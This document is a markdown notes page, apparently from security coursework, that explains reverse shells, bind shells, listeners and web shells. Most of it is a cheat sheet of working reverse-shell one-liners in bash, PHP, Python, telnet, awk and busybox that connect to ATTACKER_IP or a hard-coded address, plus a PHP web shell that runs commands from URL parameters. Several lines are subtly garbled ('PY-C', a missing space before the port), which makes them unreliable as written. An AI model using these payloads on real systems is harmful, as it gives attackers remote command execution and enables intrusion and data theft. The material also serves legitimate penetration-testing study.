---
title: Shells Overview
layout: notes
---

# Overview

A shell is software which allows a user to interact with an OS. Shells can be used by attackers for various activities:

- Remote System Control: allows attacker to execute commands or software remotely.
- Privilege Escalation: initial access can be limited or restricted, so ways to escalate can be explored.
- Data Exfiltration: attackers can use a shell to read and copy sensitive data.
- Persistence and Maintenance Access: attackers can create access via users or by creating software backdoors.
- Post-Exploitation Activities: attackers can deploy malware, create hidden accounts or delete information.
- Access Other Systems: can be used to hop through the network (pivot) to other machines.

# Reverse Shells

Sometimes called a "connect back shell". These initiate from the target system back to the attackers machine and can help avoid detection. To setup a reverse shell, you first need a listener on your machine:

```bash
nc -lvnp 443
```

<br/>This commands uses `-l` to indicate netcat to listen, `-v` to enable verbose, `-n` to prevent DNS lookup and `-p` to specify port. With this set, you can now execute the reverse shell payload on the target, there are many different payloads. An example for a pipe reverse shell is:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

- `rm -f /tmp/f` : removes any existing named pipe in /tmp/f to ensure script can create a new pipe without conflict.
- `mkfifo /tmp/f` : creates a named pipe in /tmp/f allowing for two-way communication.
- `cat /tmp/f` : reads data from the pipe and waits for input.
- `| bash -i 2>&1` : pipes output from cat to shell instance allowing attacker to execute commands interactively. `2>&1` redirects `stderr` to `stdout`.
- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f` : pipes shell output through netcat to attacker IP on attacker port.
- `>/tmp/f` : sends output of commands back to named pipe

# Bind Shell

This binds a port on the compromised system and listens for a connection. Can be used when the target does not allow outgoing connections, less popular because it must remain active and listening for connections. To setup a bind shell on a target, you can execute:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

- `rm -f /tmp/f` - removes any existing named pipe in /tmp/f to ensure script can create a new pipe without conflict.
- `mkfifo /tmp/f` - creates a named pipe in /tmp/f allowing for two-way communication.
- `cat /tmp/f` - reads data from the pipe and waits for input.
- `| bash -i 2>&1` - pipes output from cat to shell instance allowing attacker to execute commands interactively. 2>&1 redirects stderr to stdout.
- `| nc -l 0.0.0.0 8080` - starts netcat in listen mode on all interfaces port 8080, the shell will be exposed to attacker when they connect to that port
- `>/tmp/f` - sends output of commands back to named pipe

<br/>To connect to the shell on the attacker machine:

```bash
nc -nv TARGET_IP 8080
```

# Shell Listeners

- `rlwrap`: utility using readline to providing editing keyboard and history, can be used with netcat: `rlwrap nc -lvnp 443`
- `ncat`: improved version of netcat using SSL
- `socat`: can be used to create a socket connection between two data sources: `socat -d -d TCP-LISTEN:443 STDOUT`

# Shell Payloads
## Bash - Normal Reverse Shell

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

## Bash - Readline Reverse Shell

```bash
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```

<br/>This creates a new file descriptor 5 and connects to a TCP socket, it then reads and executes commands via the socket.

## Bash - File Descriptor 196 Reverse Shell

```bash
0<$196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```

<br/>Uses file descriptor 196 to establish TCP connection allowing the shell to read commands.

## Bash - File Descriptor 5 Reverse Shell

```bash
bash -i 5<>/dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

<br/>Similar to normal reverse shell but uses file descriptor 5 for input and output.

## PHP - Reverse Shell with exec

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```

## PHP - Reverse Shell with shell_exec

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```

## PHP - Reverse Shell with system

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```

## PHP - Reverse Shell with passthru

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```

## PHP - Reverse Shell with popen

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```

## Python - Exporting Environment Variables

```bash
export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

## Python - Reverse Shell using subprocess

```bash
PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
```

## Python - Short Reverse Shell

```bash
PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

## Telnet

```bash
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
```

## AWK

```bash
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## BusyBox

```bash
busybox nc ATTACKER_IP 443 -e sh
```

## Web Shells

A web shell is a script written in a language supported by a compromised web server that executes commands through the server itself. An example of PHP webshell is:

```php
<?php
if (isset($_GET['cmd'])) {
	system($_GET['cmd']);
}
?>
```

If the above is uploaded to a location on the web server, it can then be accessed via its URL like http://example.com/shell.php", variables can then be passed to it like: http://example.com/shell.php?cmd=whoami.